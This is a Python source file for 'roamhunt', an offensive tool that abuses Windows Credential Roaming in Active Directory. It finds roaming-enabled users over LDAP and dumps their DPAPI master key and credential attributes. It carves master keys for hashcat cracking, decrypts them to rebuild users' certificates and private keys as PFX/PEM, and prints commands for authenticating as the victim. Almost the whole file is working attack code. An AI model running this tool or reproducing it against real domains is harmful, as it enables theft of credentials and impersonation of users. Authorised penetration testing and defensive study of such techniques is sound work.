#!/usr/bin/env python3
"""
roamhunt - hunt Windows Credential Roaming secrets in Active Directory.

When Credential Roaming is enabled, a user's DPAPI master keys and PKI
credentials are stored (encrypted) on their AD object, in the LDAP attributes
msPKIDPAPIMasterKeys and msPKIAccountCredentials. roamhunt reads those over
LDAP and turns them into something you can act on.

Subcommands:
  search     find roaming-enabled users in LDAP (msPKIDPAPIMasterKeys=*)
  masterkey  carve the DPAPI master key out of the blob -> DPAPImk2john/hashcat
  creds      rebuild the user's certificate + private key (PFX / PEM)

Background: Mandiant "They See Me Roaming" (APT29 credential roaming),
CVE-2022-30170. For authorised testing only.

Requires: impacket, pycryptodome, cryptography, ldap3
"""
import argparse
import os
import re
import sys

from impacket.dpapi import (MasterKeyFile, MasterKey, deriveKeysFromUser,
                            DPAPI_BLOB)
from Crypto.PublicKey import RSA
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import (
    pkcs12, BestAvailableEncryption, NoEncryption)
from ldap3 import Server, Connection, NTLM, SIMPLE, SASL, KERBEROS, ALL, SUBTREE

# DPAPI master key file layout (little-endian):
#   version       DWORD  (4)   always 0x00000002
#   unknown              (8)
#   guid                 (72)  master key GUID as UTF-16LE text
#   unknown              (8)
#   flags         DWORD  (4)
#   masterkeyLen  QWORD  (8)
#   backupkeyLen  QWORD  (8)
#   credhistLen   QWORD  (8)
#   domainkeyLen  QWORD  (8)
#   ... key blobs, sized by the four lengths above
MK_HEADER_LEN = 128          # bytes up to and including the four length fields
GUID_OFFSET = 12             # version(4) + unknown(8) before the GUID

DPAPI_MARKER = b"\x01\x00\x00\x00" + bytes.fromhex("d08c9ddf0115d1118c7a00c04fc297eb")

LDAP_ATTRS = ["sAMAccountName", "objectSid",
              "msPKIDPAPIMasterKeys", "msPKIAccountCredentials"]

# One DN-Binary value: B:<hex char count>:<HEX>:<object DN>
_DN_BINARY = re.compile(r"B:\d+:([0-9A-Fa-f]+):", re.IGNORECASE)


# =====================================================================
#  Shared: parse the Credential Roaming LDAP attribute values
# =====================================================================
def parse_attribute(value):
    """Return a list of blob bytes from an attribute value.

    Accepts the DN-Binary form (bloodyAD / LDAP: 'B:1744:2530..:CN=..'), bare
    hex, or raw bytes (as ldap3 may hand it over). Several ';'-separated values
    become several blobs.
    """
    if isinstance(value, (bytes, bytearray)):
        if value[:2] == b"B:":
            value = value.decode("latin-1")
        else:
            return [bytes(value)]

    blobs = []
    for entry in value.split(";"):
        entry = entry.strip()
        if not entry:
            continue
        m = _DN_BINARY.search(entry)
        if m:
            blobs.append(bytes.fromhex(m.group(1)))
        else:
            cleaned = re.sub(r"[^0-9A-Fa-f]", "", entry)
            if cleaned:
                blobs.append(bytes.fromhex(cleaned))
    return blobs


def attribute_from_dump(text, attr_name):
    """Pull one attribute's value out of a pasted full-object dump.

    If `text` isn't a multi-line dump it is returned stripped as-is, so this is
    safe whether the user passed a whole object or just the bare value.
    """
    for line in text.splitlines():
        if line.strip().lower().startswith(attr_name.lower()):
            return line.split(":", 1)[1].strip()
    return text.strip()


# =====================================================================
#  masterkey: carve the DPAPI master key file out of the roaming blob
# =====================================================================
def carve_master_key_file(blob):
    """Locate and return the embedded DPAPI master key file from a roaming blob.

    The attribute value is not a bare master key file: Microsoft wraps it in a
    roaming structure starting with "%0\\{GUID}" (ASCII). DPAPImk2john parses
    from byte 0 and chokes on that wrapper, so we find the embedded file.
    """
    # 1) Read the GUID from the "%0\<guid>" ASCII prefix.
    m = re.search(rb"\\([0-9A-Fa-f\-]{36})", blob)
    if not m:
        raise ValueError("roaming GUID prefix not found")
    guid = m.group(1).decode("ascii")

    # 2) That same GUID is stored as UTF-16LE right after the file header.
    pos = -1
    for candidate in (guid, guid.lower(), guid.upper()):
        pos = blob.find(candidate.encode("utf-16-le"))
        if pos != -1:
            break
    if pos == -1:
        raise ValueError("UTF-16LE GUID not found inside the blob")

    start = pos - GUID_OFFSET
    if start < 0 or blob[start:start + 4] != b"\x02\x00\x00\x00":
        raise ValueError("version marker 0x02 not where expected")

    # 3) Read the four length fields and compute the exact file size.
    off = start + 96                          # version(4)+unk(8)+guid(72)+unk(8)+flags(4)
    lengths = [int.from_bytes(blob[off + i:off + i + 8], "little") for i in (0, 8, 16, 24)]
    total = MK_HEADER_LEN + sum(lengths)

    # If the computed size looks wrong, hand over everything from the version
    # marker; DPAPImk2john reads by the internal lengths and ignores trailing data.
    if total <= MK_HEADER_LEN or start + total > len(blob):
        return blob[start:]
    return blob[start:start + total]


def cmd_masterkey(args):
    # Input source: inline value, then file, then stdin.
    if args.value is not None:
        raw = args.value
    elif args.input:
        raw = open(args.input).read()
    else:
        raw = sys.stdin.read()

    raw = attribute_from_dump(raw, "msPKIDPAPIMasterKeys")
    blobs = parse_attribute(raw)
    if not blobs:
        sys.exit("[-] no hex blob found in the input")

    written = 0
    for idx, blob in enumerate(blobs):
        try:
            mk = carve_master_key_file(blob)
        except ValueError as e:
            print(f"[-] blob #{idx}: {e}", file=sys.stderr)
            continue
        suffix = "" if len(blobs) == 1 else f"_{idx}"
        path = f"{args.output}{suffix}.mk"
        with open(path, "wb") as f:
            f.write(mk)
        print(f"[+] wrote {path}  ({len(mk)} bytes)")
        written += 1

    if not written:
        sys.exit("[-] nothing carved - check the input")

    print("\nNext:")
    print(f"  DPAPImk2john.py -mk {args.output}.mk -S <USER_SID> -c domain > mk.hash")
    print("  hashcat -m 15310 mk.hash rockyou.txt      # fall back to -m 15300 if needed")


# =====================================================================
#  creds: rebuild the certificate + private key from msPKIAccountCredentials
# =====================================================================
def decrypt_masterkey(path, sid, password):
    """Decrypt the master key file using the user's SID + password."""
    data = open(path, "rb").read()
    mkf = MasterKeyFile(data)
    mk = MasterKey(data[len(mkf):len(mkf) + mkf["MasterKeyLen"]])
    for k in deriveKeysFromUser(sid, password):
        dec = mk.decrypt(k)
        if dec:
            return dec
    sys.exit("[-] master key decryption failed (wrong password or SID?)")


def decrypt_blobs(blob, masterkey):
    """Decrypt every DPAPI blob found in the attribute, return the plaintexts."""
    plains = []
    for m in re.finditer(re.escape(DPAPI_MARKER), blob):
        try:
            dec = DPAPI_BLOB(blob[m.start():]).decrypt(masterkey)
        except Exception:
            dec = None
        if dec:
            plains.append(dec)
    return plains


def extract_certificates(blob):
    """Return every parseable DER X.509 certificate found in the blob."""
    certs = []
    for m in re.finditer(b"\x30\x82", blob):
        p = m.start()
        length = int.from_bytes(blob[p + 2:p + 4], "big") + 4
        try:
            certs.append(x509.load_der_x509_certificate(blob[p:p + length]))
        except Exception:
            continue
    return certs


def recover_keypair(plains, certs):
    """
    For each certificate, look through the decrypted blobs for the matching
    private exponent d. d is a modulus-sized little-endian integer at some
    offset; we confirm a candidate by an encrypt/decrypt round-trip against the
    cert's public key, so the blob's exact header layout doesn't matter.
    """
    for cert in certs:
        pn = cert.public_key().public_numbers()
        n, e = pn.n, pn.e
        kb = (n.bit_length() + 7) // 8
        probe = int.from_bytes(os.urandom(16), "big") % n or 2
        ct = pow(probe, e, n)
        for dec in plains:
            for off in range(0, len(dec) - kb + 1):
                if dec[off + kb - 1] == 0:           # top byte (LE) of a ~2048-bit d is non-zero
                    continue
                d = int.from_bytes(dec[off:off + kb], "little")
                if d > 1 and pow(ct, d, n) == probe:
                    return cert, RSA.construct((n, e, d))
    return None, None


def cmd_creds(args):
    masterkey = decrypt_masterkey(args.mk, args.sid, args.password)
    print(f"[+] master key decrypted ({len(masterkey)} bytes)")

    try:
        value = open(args.creds).read()
    except OSError:
        value = args.creds
    value = attribute_from_dump(value, "msPKIAccountCredentials")
    blob = b"".join(parse_attribute(value))

    plains = decrypt_blobs(blob, masterkey)
    print(f"[+] decrypted {len(plains)} DPAPI blob(s)")
    certs = extract_certificates(blob)
    print(f"[+] found {len(certs)} certificate(s)")
    if not certs:
        sys.exit("[-] no certificate in the attribute")

    cert, rsa = recover_keypair(plains, certs)
    if rsa is None:
        sys.exit("[-] could not recover a private key matching any certificate")
    print(f"[+] matched certificate: {cert.subject.rfc4514_string()}")
    print(f"[+] recovered {rsa.size_in_bits()}-bit RSA private key")

    # A clientAuth cert lets you authenticate AS the user (PKINIT / Schannel),
    # which is usually the real prize - flag it when it's there.
    try:
        eku = cert.extensions.get_extension_for_class(x509.ExtendedKeyUsage).value
        ekus = [o._name or o.dotted_string for o in eku]
        print(f"[+] EKUs: {', '.join(ekus)}")
        if any("clientAuth" in x or x == "1.3.6.1.5.5.7.3.2" for x in ekus):
            print("[!] clientAuth present -> usable to authenticate as this user")
    except x509.ExtensionNotFound:
        pass

    key = serialization.load_pem_private_key(rsa.export_key(format="PEM"), password=None)

    # Output basename: the certificate's CN, unless overridden with -o.
    cn = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)
    base = args.output or (re.sub(r"[^A-Za-z0-9._-]", "_", cn[0].value) if cn else "roamed")

    written = []
    if args.format in ("pfx", "both"):
        enc = BestAvailableEncryption(args.pfx_pass.encode()) if args.pfx_pass else NoEncryption()
        pfx = pkcs12.serialize_key_and_certificates(
            name=base.encode(), key=key, cert=cert, cas=None, encryption_algorithm=enc)
        open(f"{base}.pfx", "wb").write(pfx)
        written.append(f"{base}.pfx")
    if args.format in ("pem", "both"):
        open(f"{base}.crt", "wb").write(cert.public_bytes(serialization.Encoding.PEM))
        open(f"{base}.key", "wb").write(
            key.private_bytes(serialization.Encoding.PEM,
                              serialization.PrivateFormat.TraditionalOpenSSL,
                              serialization.NoEncryption()))
        written += [f"{base}.crt", f"{base}.key"]

    print(f"[+] wrote {' / '.join(written)}")
    if args.format in ("pfx", "both"):
        print(f"\nUse it:  curl -vk --cert-type P12 --cert {base}.pfx"
              f"{':' + args.pfx_pass if args.pfx_pass else ''} https://<webmail>/")


# =====================================================================
#  search: find roaming-enabled users in LDAP
# =====================================================================
def format_sid(raw):
    """Turn a binary objectSid into its S-1-5-... string form."""
    if not raw:
        return ""
    revision = raw[0]
    sub_count = raw[1]
    authority = int.from_bytes(raw[2:8], "big")
    sid = f"S-{revision}-{authority}"
    for i in range(sub_count):
        off = 8 + i * 4
        sid += "-" + str(int.from_bytes(raw[off:off + 4], "little"))
    return sid


def base_dn_from_domain(domain):
    return ",".join(f"DC={part}" for part in domain.split("."))


def attr_value_to_text(raw):
    """Normalise one raw attribute value to a line the parser accepts."""
    if raw[:2] == b"B:":
        return raw.decode("latin-1")
    return raw.hex()


def bloodyad_cmd(args, sam, attr):
    """Render a bloodyAD command (mirroring the search auth) to fetch one attribute."""
    parts = [f"bloodyAD --host {args.host}"]
    if args.domain:
        parts.append(f"-d {args.domain}")
    if args.user:
        parts.append(f"-u {args.user}")
    if args.kerberos:
        parts.append("-k")
    elif args.password:
        parts.append(f"-p '{args.password}'")
    parts.append(f"get object {sam} --attr {attr}")
    return " ".join(parts)


def cmd_search(args):
    host = args.host
    if not args.kerberos and not (args.user and args.password):
        sys.exit("[-] a non-Kerberos bind needs -u and -p (or use -k for Kerberos)")

    port = 636 if args.ssl else 389
    server = Server(host, port=port, use_ssl=args.ssl, get_info=ALL)

    try:
        if args.kerberos:
            # Uses the ticket already in KRB5CCNAME (kinit / impacket getTGT).
            # GSSAPI builds the SPN ldap/<host>, so -H must be the DC FQDN.
            conn = Connection(server, authentication=SASL,
                              sasl_mechanism=KERBEROS, auto_bind=True)
            who = "Kerberos (ccache)"
        elif args.domain:
            conn = Connection(server, user=f"{args.domain}\\{args.user}",
                              password=args.password, authentication=NTLM,
                              auto_bind=True)
            who = f"{args.domain}\\{args.user}"
        else:
            conn = Connection(server, user=args.user, password=args.password,
                              authentication=SIMPLE, auto_bind=True)
            who = args.user
    except Exception as e:
        sys.exit(f"[-] LDAP bind failed: {e}")
    print(f"[+] bound to {host} as {who}")

    base_dn = args.base_dn or (base_dn_from_domain(args.domain) if args.domain else None)
    if not base_dn:
        info = getattr(server, "info", None)
        ncs = getattr(info, "naming_contexts", None) if info else None
        if ncs:
            base_dn = ncs[0]
    if not base_dn:
        sys.exit("[-] could not determine a base DN; pass one with -b/--base-dn")
    print(f"[+] base DN: {base_dn}")
    print(f"[+] filter : {args.filter}")

    conn.search(base_dn, args.filter, search_scope=SUBTREE, attributes=LDAP_ATTRS)
    if not conn.entries:
        print("[-] no roaming-enabled user found (or not allowed to read it)")
        return

    users = []
    for entry in conn.entries:
        sam = entry["sAMAccountName"].value or "?"
        sid_raw = entry["objectSid"].raw_values[0] if entry["objectSid"] else b""
        mk_vals = list(entry["msPKIDPAPIMasterKeys"].raw_values)
        cr_vals = list(entry["msPKIAccountCredentials"].raw_values)
        users.append((sam, format_sid(sid_raw), mk_vals, cr_vals))

    print(f"[+] {len(users)} user(s) with credential roaming:\n")
    for sam, sid, mk_vals, cr_vals in users:
        print(f"  {sam:<24} SID={sid}  masterkeys={len(mk_vals)}  creds={len(cr_vals)}")

    if args.output:
        os.makedirs(args.output, exist_ok=True)
        for sam, sid, mk_vals, cr_vals in users:
            if mk_vals:
                with open(os.path.join(args.output, f"{sam}.masterkeys"), "w") as f:
                    f.write(";".join(attr_value_to_text(v) for v in mk_vals))
            if cr_vals:
                with open(os.path.join(args.output, f"{sam}.creds"), "w") as f:
                    f.write(";".join(attr_value_to_text(v) for v in cr_vals))
        print(f"\n[+] dumped attribute files to {args.output}/")
        print("    feed them to:")
        print(f"      roamhunt.py masterkey -i {args.output}/<user>.masterkeys -o <user>")
        print(f"      roamhunt.py creds -mk <user>.mk -S <SID> -p <pass> -c {args.output}/<user>.creds")
        return

    # No -o: show how to pull an attribute by hand (feeds masterkey's -v / -i / stdin).
    print("\n[*] re-run with -o <dir> to dump the masterkey + creds attributes to files,")
    print("    or grab one using this command :")
    for sam, sid, mk_vals, cr_vals in users[:3]:
        print()
        print(f"  {bloodyad_cmd(args, sam, 'msPKIDPAPIMasterKeys')} \\")
        print(f"  | python3 roamhunt.py masterkey -o {sam}")
    if len(users) > 3:
        print(f"\n      ... (+{len(users) - 3} more)")


# =====================================================================
#  CLI
# =====================================================================
def build_parser():
    p = argparse.ArgumentParser(
        prog="roamhunt.py",
        description="Hunt Windows Credential Roaming secrets in Active Directory.")
    sub = p.add_subparsers(dest="command", required=True, metavar="COMMAND")

    # search
    s = sub.add_parser("search", help="find roaming-enabled users in LDAP")
    s.add_argument("-H", "--host", required=True, help="DC hostname or IP")
    s.add_argument("-d", "--domain", help="AD domain, e.g. corp.local (enables NTLM bind)")
    s.add_argument("-u", "--user", help="bind account (not needed with -k)")
    s.add_argument("-p", "--password", help="bind password (not needed with -k)")
    s.add_argument("-k", dest="kerberos", action="store_true",
                   help="Kerberos bind via the ticket in KRB5CCNAME (GSSAPI); pass the DC FQDN with -H")
    s.add_argument("-b", "--base-dn", help="search base (derived from --domain if omitted)")
    s.add_argument("--filter", default="(msPKIDPAPIMasterKeys=*)",
                   help="LDAP filter (default: users with a roamed master key)")
    s.add_argument("--ssl", action="store_true", help="use LDAPS (port 636)")
    s.add_argument("-o", "--output", help="directory to dump per-user attribute files")
    s.set_defaults(func=cmd_search)

    # masterkey
    m = sub.add_parser("masterkey", help="carve the DPAPI master key from the blob")
    m.add_argument("-v", "--value", help="the attribute value passed directly")
    m.add_argument("-i", "--input", help="file holding the attribute value")
    m.add_argument("-o", "--output", default="masterkey", help="output basename")
    m.set_defaults(func=cmd_masterkey)

    # creds
    c = sub.add_parser("creds", help="rebuild cert + private key as PFX / PEM")
    c.add_argument("-mk", required=True, help="carved master key file (from `masterkey`)")
    c.add_argument("-S", "--sid", required=True, help="user's SID (objectSid)")
    c.add_argument("-p", "--password", required=True, help="user's password")
    c.add_argument("-c", "--creds", required=True,
                   help="msPKIAccountCredentials value, or a file holding it")
    c.add_argument("-o", "--output", help="output basename (default: the certificate CN)")
    c.add_argument("--format", choices=["pfx", "pem", "both"], default="pfx",
                   help="pfx (default), pem (crt+key), or both")
    c.add_argument("--pfx-pass", default="", help="password for the .pfx (default: none)")
    c.set_defaults(func=cmd_creds)

    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    args.func(args)


if __name__ == "__main__":
    main()
